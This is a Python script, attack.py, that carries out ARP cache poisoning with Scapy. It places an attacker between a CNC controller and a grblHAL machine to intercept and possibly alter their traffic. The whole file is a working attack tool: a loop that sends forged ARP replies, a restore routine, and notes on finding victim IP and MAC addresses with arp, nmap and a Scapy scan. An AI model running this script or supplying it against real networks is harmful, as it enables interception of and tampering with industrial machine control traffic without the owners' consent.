"""
attack.py - ARP Cache Poisoning Script for MitM Attacks
Author: luke pepin
Description: Establishes a Man-in-the-Middle position between a CNC controller and a grblHAL machine by poisoning their ARP caches.
"""

from scapy.all import ARP, send
import time

# === Placeholder Variables ===
# Replace these with actual IP and MAC addresses of the victims and attacker.
CNC_CONTROLLER_IP = "192.168.1.10"
CNC_CONTROLLER_MAC = "AA:BB:CC:DD:EE:01"
GRBLHAL_MACHINE_IP = "192.168.1.20"
GRBLHAL_MACHINE_MAC = "AA:BB:CC:DD:EE:02"
ATTACKER_IP = "192.168.1.100"
ATTACKER_MAC = "AA:BB:CC:DD:EE:99"

POISON_INTERVAL = 2  # seconds between poison packets

def poison(target_ip, target_mac, spoof_ip, attacker_mac):
    """
    Sends a single ARP reply to the target, telling it that 'spoof_ip' is at our (attacker's) MAC address.
    This tricks the target into sending traffic for 'spoof_ip' to us.
    """
    # Construct the ARP reply packet
    arp_response = ARP(
        op=2,  # ARP reply
        psrc=spoof_ip,  # IP address to spoof
        hwsrc=attacker_mac,  # Attacker's MAC address
        pdst=target_ip,  # Target's IP address
        hwdst=target_mac  # Target's MAC address
    )
    # Send the packet
    send(arp_response, verbose=False)
    print(f"[+] Sent ARP poison: {target_ip} now thinks {spoof_ip} is at {attacker_mac}")

def restore(target_ip, target_mac, real_ip, real_mac):
    """
    Restores the original ARP mapping by sending the correct MAC for the real_ip.
    """
    arp_restore = ARP(
        op=2,
        psrc=real_ip,
        hwsrc=real_mac,
        pdst=target_ip,
        hwdst=target_mac
    )
    send(arp_restore, count=3, verbose=False)
    print(f"[+] Restored ARP table for {target_ip}")

def main():
    print("[*] Starting ARP poisoning attack...")
    try:
        while True:
            # Poison CNC Controller: make it think grblHAL's IP is at attacker's MAC
            poison(CNC_CONTROLLER_IP, CNC_CONTROLLER_MAC, GRBLHAL_MACHINE_IP, ATTACKER_MAC)
            # Poison grblHAL Machine: make it think CNC Controller's IP is at attacker's MAC
            poison(GRBLHAL_MACHINE_IP, GRBLHAL_MACHINE_MAC, CNC_CONTROLLER_IP, ATTACKER_MAC)
            time.sleep(POISON_INTERVAL)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C! Restoring ARP tables...")
        # Restore ARP tables to prevent network disruption
        restore(CNC_CONTROLLER_IP, CNC_CONTROLLER_MAC, GRBLHAL_MACHINE_IP, GRBLHAL_MACHINE_MAC)
        restore(GRBLHAL_MACHINE_IP, GRBLHAL_MACHINE_MAC, CNC_CONTROLLER_IP, CNC_CONTROLLER_MAC)
        print("[*] ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()

"""
=== How to Find IP and MAC Addresses ===
- Use 'arp -a' in Windows PowerShell to list IP/MAC pairs on your subnet.
- Use 'nmap -sn <subnet>' to discover live hosts.
- Use Scapy's ARP scanning:
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)
    for snd, rcv in ans:
        print(rcv.psrc, rcv.hwsrc)
"""
